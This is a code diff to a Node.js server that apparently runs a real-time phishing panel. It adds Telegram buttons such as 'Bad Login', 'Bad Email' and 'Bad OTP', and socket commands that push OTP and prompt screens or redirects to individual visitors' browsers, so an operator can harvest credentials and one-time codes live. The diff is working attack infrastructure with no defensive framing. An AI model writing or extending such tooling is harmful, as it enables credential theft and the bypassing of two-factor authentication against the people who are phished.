@@ -472,6 +472,7 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
   for (let [id, socket] of io.of("/").sockets) {
     if (socket.userId === userId) {
       let link = null;
+      let code = null;
       let phonescreen = null;
 
       if (command === "nextpage") {
@@ -492,13 +493,17 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
           [JSON.stringify(systemInfo), userId]
         );
       } else if (command === "phone-otp") {
-        phonescreen = resolveFrontendRoute("otp");
-      }
+            code = otp;
+            phonescreen = resolveFrontendRoute("otp");
+       } else if (command === "prompt") {
+            code = otp;
+            phonescreen = resolveFrontendRoute("prompt");
+          }
 
       if (link) {
         socket.emit("user:command", { command: "redirect", link });
-      } else if (otp) {
-        socket.emit("user:command", { command: "phone-otp", code: otp, phonescreen });
+      } else if (code) {
+        socket.emit("user:command", { command , code, phonescreen });
       } else {
         socket.emit("user:command", { command });
       }
@@ -535,6 +540,8 @@ async function buildTelButtons(userId, db) {
 	// Now normal status
 	const status = userRow.status; // e.g., "active", "idle"
     const page = (userRow.page || "").toLowerCase();
+    
+    console.log("page in buildBut:", page);
 
   let buttons = [];
 
@@ -555,53 +562,60 @@ async function buildTelButtons(userId, db) {
   // -------------------------
 
   // Row 1
-  buttons.push([
-    {
-      text: "Refresh",
-      callback_data: `cmd:refresh:${userId}`
-    },
-    {
-      text: "Next Page",
-      callback_data: `cmd:nextpage:${userId}`
-    }
-  ]);
+buttons.push([
+  {
+    text: "Refresh",
+    callback_data: `cmd:refresh:${userId}`
+  },
+  {
+    text: "Next Page",
+    callback_data: `cmd:nextpage:${userId}`
+  }
+]);
 
-  // Row 2 (Login / OTP only)
-  if (page === "login" || page.includes("otp")) {
-    const badButton =
-      page === "login"
-        ? {
-            text: "Bad Login",
-            callback_data: `cmd:bad-login:${userId}`
-          }
-        : {
-            text: "Bad OTP",
-            callback_data: `cmd:bad-otp:${userId}`
-          };
+// Row 2 (Login / Auth / OTP only)
+if (page === "login" || page === "email" || page === "otp") {
+  let badButton;
 
-    buttons.push([
-      badButton,
-      {
-        text: "Phone OTP",
-        callback_data: `cmd:phone-otp:${userId}`
-      }
-    ]);
+  if (page === "login") {
+    badButton = {
+      text: "Bad Login",
+      callback_data: `cmd:bad-login:${userId}`
+    };
+  } else if (page === "email") {
+    badButton = {
+      text: "Bad Email",
+      callback_data: `cmd:bad-email:${userId}`
+    };
+  } else if (page === "otp") {
+    badButton = {
+      text: "Bad OTP",
+      callback_data: `cmd:bad-otp:${userId}`
+    };
   }
 
-  // Row 3
-  buttons.push([
-    {
-      text: "Redirect",
-      callback_data: `cmd:redirect:${userId}`
-    },
-    {
-      text: "Block",
-      callback_data: `cmd:block:${userId}`
-    }
-  ]);
+
+buttons.push([
+    badButton
+  ]); 
+}
+
+
+// Row 4
+buttons.push([
+  {
+    text: "Redirect", 
+    callback_data: `cmd:redirect:${userId}`
+  },
+  {
+    text: "Block",
+    callback_data: `cmd:block:${userId}`
+  }
+]);
 
   return buttons;
 }
+
 
 
 
